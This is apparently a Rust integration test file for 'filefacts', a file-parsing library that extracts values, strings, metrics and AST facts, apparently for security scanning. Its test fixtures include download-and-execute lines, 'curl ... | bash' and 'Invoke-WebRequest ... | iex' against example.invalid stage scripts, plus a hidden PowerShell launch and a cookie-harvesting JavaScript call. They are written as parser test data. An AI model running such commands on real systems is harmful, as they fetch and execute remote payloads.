//! End-to-end tests against synthetic and real fixtures.
//!
//! Every test here asserts the no-duplicate-work guarantee
//! (`parse_count() == 1` after exercising all views) so the contract
//! holds for downstream embedders.

use filefacts::{open, open_with_path, FileType};

#[test]
fn json_manifest_parses_once_through_all_views() {
    let bytes = br#"{"name":"sample","version":"1.0.0","scripts":{"preinstall":"echo hi"}}"#;
    let parsed = open_with_path(std::path::Path::new("package.json"), bytes).unwrap();
    assert_eq!(parsed.fileid().file_type(), FileType::PackageJson);

    let values = parsed.values();
    let strings = parsed.strings();
    let metrics = parsed.metrics();

    assert_eq!(values.get("name").and_then(|v| v.as_str()), Some("sample"));
    assert_eq!(
        values.get("scripts.preinstall").and_then(|v| v.as_str()),
        Some("echo hi")
    );
    assert_eq!(
        strings.len(),
        0,
        "JSON manifests do not emit ASCII runs in v1"
    );
    assert!(metrics.get("file.size_bytes").unwrap() > 0.0);

    assert_eq!(
        parsed.parse_count(),
        1,
        "all three views must share a single extraction pass"
    );
}

#[test]
fn zip_archive_emits_member_listing_and_aggregates() {
    // Hand-build a minimal ZIP with three regular-file entries so we
    // don't depend on an external fixture for an integration test.
    let bytes = build_minimal_zip();
    let parsed = open(&bytes).unwrap();
    assert_eq!(parsed.fileid().file_type(), FileType::Zip);

    let values = parsed.values();
    let metrics = parsed.metrics();

    let members = values
        .get("archive.members")
        .and_then(|v| v.as_array())
        .expect("archive.members should be present");
    assert_eq!(members.len(), 3);

    assert_eq!(metrics.get("archive.member_count"), Some(3.0));
    assert!(metrics.get("file.entropy").is_some());

    assert_eq!(parsed.parse_count(), 1);
}

#[test]
fn empty_input_classifies_and_exposes_metrics() {
    let parsed = open(&[]).unwrap();
    // An empty byte slice has no meaningful format; we still expose
    // file.size_bytes and file.entropy so downstream consumers can
    // observe the degenerate case uniformly.
    assert_eq!(parsed.metrics().get("file.size_bytes"), Some(0.0));
    assert_eq!(parsed.metrics().get("file.entropy"), Some(0.0));
    assert_eq!(parsed.parse_count(), 1);
}

#[test]
fn javascript_ast_projection_is_complete() {
    let source = br#"
        const fs = require('fs');
        chrome.cookies.getAll({ url: 'https://example.com' }, (c) => {});
        fetch('https://api.example.com/data');
        const decoded = atob("aGVsbG8=");
    "#;
    let parsed = open_with_path(std::path::Path::new("sample.js"), source).unwrap();
    assert_eq!(parsed.fileid().file_type(), FileType::JavaScript);

    let ast = parsed.ast();
    assert!(
        ast.targets.contains(&"chrome.cookies.getAll".to_string()),
        "expected dotted target in targets, got {:?}",
        ast.targets
    );
    assert!(
        ast.call_strings
            .get("fetch")
            .is_some_and(|args| args.contains(&"https://api.example.com/data".to_string())),
        "fetch's string-literal arg should be recorded"
    );
    assert!(
        ast.call_strings
            .get("atob")
            .is_some_and(|args| args.contains(&"aGVsbG8=".to_string())),
        "atob's literal should be recorded"
    );

    // Parse count must stay at 1 after exercising all five views.
    let _ = parsed.values();
    let _ = parsed.strings();
    let _ = parsed.metrics();
    let _ = parsed.ast();
    let _ = parsed.fileid();
    assert_eq!(
        parsed.parse_count(),
        1,
        "all five views must share a single extraction pass"
    );
}

#[test]
fn python_ast_projection_has_imports_bindings_and_nested_literals() {
    let source = br#"import base64
import os
import subprocess as sp
from urllib import request

API_URL = "https://example.invalid/api"

def encode_value(value):
    raw = value.encode("utf-8")
    return base64.b64encode(raw).decode("ascii")

class Runner:
    def __init__(self, home):
        self.home = home

    async def fetch(self, name):
        payload = {"path": f"{self.home}/{name}.txt", "kind": "probe"}
        response = request.urlopen(API_URL, data=str(payload).encode("utf-8"))
        return response.read().decode("utf-8")

def run_command():
    env_copy = os.environ.copy()
    return sp.check_output(["/bin/echo", env_copy.get("USER", "unknown")]).decode()
"#;
    let parsed = open_with_path(std::path::Path::new("sample.py"), source).unwrap();
    assert_eq!(parsed.fileid().file_type(), FileType::Python);

    let imports: Vec<&str> = parsed.imports().iter().map(|i| i.name.as_str()).collect();
    assert!(
        imports.contains(&"subprocess as sp"),
        "aliased imports should keep the alias fact, got {imports:?}"
    );
    assert!(
        imports.contains(&"request"),
        "from-import local names should be visible, got {imports:?}"
    );

    let ast = parsed.ast();
    assert!(
        ast.targets
            .contains(&"sp.check_output().decode".to_string()),
        "method calls on call results should keep the source chain, got {:?}",
        ast.targets
    );
    assert!(
        ast.call_strings
            .get("sp.check_output")
            .is_some_and(|args| args.contains(&"/bin/echo".to_string())),
        "array literal strings passed to calls should be recorded"
    );
    assert!(
        ast.call_strings
            .get("sp.check_output")
            .is_none_or(|args| !args.contains(&"USER".to_string())),
        "nested call literals should stay attached to the nested call"
    );
    assert!(
        ast.call_strings
            .get("env_copy.get")
            .is_some_and(|args| args.contains(&"USER".to_string())),
        "nested call literals should still be recorded on their own call"
    );
    assert!(
        ast.binds.iter().any(|a| {
            a.target == "API_URL"
                && a.scope == "module"
                && a.shape == filefacts::ArgShape::String
                && a.string.as_deref() == Some("https://example.invalid/api")
        }),
        "module string constants should be exposed as assignment facts, got {:?}",
        ast.binds
    );

    assert_eq!(parsed.parse_count(), 1);
}

#[test]
fn shell_and_powershell_commands_populate_ast_calls() {
    let shell = br#"#!/bin/sh
curl -sL "http://example.invalid/stage.sh" | bash
-H "Header: value"
chmod +x ./stage.sh
"#;
    let parsed = open_with_path(std::path::Path::new("stage.sh"), shell).unwrap();
    let ast = parsed.ast();
    assert!(
        ast.targets.contains(&"curl".to_string()) && ast.targets.contains(&"bash".to_string()),
        "shell command names should be call targets, got {:?}",
        ast.targets
    );
    assert!(
        ast.call_strings
            .get("curl")
            .is_some_and(|args| args.contains(&"http://example.invalid/stage.sh".to_string())),
        "shell string arguments should attach to their command"
    );
    assert!(
        !ast.targets.iter().any(|target| target.starts_with('-')),
        "shell option tokens should not become command targets, got {:?}",
        ast.targets
    );

    let ps = br#"Invoke-WebRequest -Uri "http://example.invalid/stage.ps1" | iex
Start-Process powershell -ArgumentList "-nop", "-w hidden"
"#;
    let parsed = open_with_path(std::path::Path::new("stage.ps1"), ps).unwrap();
    let ast = parsed.ast();
    assert!(
        ast.targets.contains(&"Invoke-WebRequest".to_string())
            && ast.targets.contains(&"iex".to_string())
            && ast.targets.contains(&"Start-Process".to_string()),
        "PowerShell command names should be call targets, got {:?}",
        ast.targets
    );
    assert!(
        ast.call_strings
            .get("Invoke-WebRequest")
            .is_some_and(|args| args.contains(&"http://example.invalid/stage.ps1".to_string())),
        "PowerShell string arguments should attach to their command"
    );
}

#[test]
fn typed_fact_views_are_not_mirrored_in_values() {
    let source = br"
        import fs from 'fs';
        class Runner {}
        function main() { return 'ok'; }
        fetch('https://example.com');
    ";
    let parsed = open_with_path(std::path::Path::new("sample.js"), source).unwrap();

    assert!(
        !parsed.imports().is_empty(),
        "imports typed view should be populated"
    );
    assert!(
        parsed.functions().iter().any(|f| f.name == "main"),
        "functions typed view should be populated"
    );
    assert!(
        !parsed.strings().is_empty(),
        "strings typed view should be populated"
    );
    assert!(
        !parsed.ast().is_empty(),
        "ast typed view should be populated"
    );

    let values = parsed.values();
    assert_eq!(
        values.get("source.language").and_then(|v| v.as_str()),
        Some("javascript")
    );
    for path in ["imports", "functions", "classes", "strings", "ast"] {
        assert!(
            values.get(path).is_none(),
            "{path} must live only in its typed filefacts view"
        );
    }
}

#[test]
fn binary_typed_fact_views_are_not_mirrored_in_values() {
    let bytes = std::fs::read("../cleave/tests/fixtures/test.exe").expect("PE fixture present");
    let parsed = open(&bytes).unwrap();

    assert!(
        !parsed.imports().is_empty(),
        "imports typed view should be populated"
    );
    assert!(
        !parsed.sections().is_empty(),
        "sections typed view should be populated"
    );

    let values = parsed.values();
    for path in [
        "imports",
        "exports",
        "functions",
        "sections",
        "strings",
        "ast",
        "errors",
    ] {
        assert!(
            values.get(path).is_none(),
            "{path} must live only in its typed filefacts view"
        );
    }
}

#[test]
fn ast_metrics_mirror_ast_paths() {
    // Verify the metric-naming convention: AST-derived metrics use
    // the `ast.` prefix and mirror the view's path shape.
    let source = b"const a = [1,2,3,4,5,6,7,8,9,10,11,12]; const u = 'a'+'b'+'c'+'d';";
    let parsed = open_with_path(std::path::Path::new("x.js"), source).unwrap();
    let m = parsed.metrics();
    assert!(m.get("ast.node_count").unwrap_or(0.0) > 0.0);
    assert_eq!(m.get("ast.array_literal_max_length"), Some(12.0));
    assert_eq!(m.get("ast.string_concat_chain_max_length"), Some(4.0));
}

#[test]
fn non_source_file_yields_empty_ast() {
    let parsed = open(b"{\"name\":\"x\"}").unwrap();
    // No view has been requested yet — parse_count is still 0.
    assert_eq!(parsed.parse_count(), 0);
    // The first view access (any of them) bumps parse_count to 1.
    assert!(parsed.ast().is_empty());
    assert_eq!(parsed.parse_count(), 1);
    // Subsequent view accesses share the same cached extraction.
    let _ = parsed.values();
    let _ = parsed.strings();
    let _ = parsed.metrics();
    assert_eq!(
        parsed.parse_count(),
        1,
        "non-source files still honour the single-parse contract"
    );
}

#[test]
fn unrecognised_bytes_still_extract_generic_metrics() {
    let bytes = vec![0xaa_u8; 4096];
    let parsed = open(&bytes).unwrap();
    let m = parsed.metrics();
    assert_eq!(m.get("file.size_bytes"), Some(4096.0));
    // A single repeated byte has zero entropy.
    assert!(m.get("file.entropy").unwrap().abs() < 1e-9);
    assert_eq!(parsed.parse_count(), 1);
}

/// Build a minimal ZIP containing three regular-file entries with
/// distinct paths. Pure-Rust, no external test fixture required.
fn build_minimal_zip() -> Vec<u8> {
    use std::io::Write;
    use zip::write::SimpleFileOptions;
    let mut buf = Vec::new();
    let cursor = std::io::Cursor::new(&mut buf);
    let mut writer = zip::ZipWriter::new(cursor);
    let options = SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);

    writer.start_file("a.txt", options).unwrap();
    writer.write_all(b"alpha\n").unwrap();
    writer.start_file("dir/b.txt", options).unwrap();
    writer.write_all(b"beta\n").unwrap();
    writer.start_file("dir/c.txt", options).unwrap();
    writer.write_all(b"gamma\n").unwrap();
    writer.finish().unwrap();
    buf
}
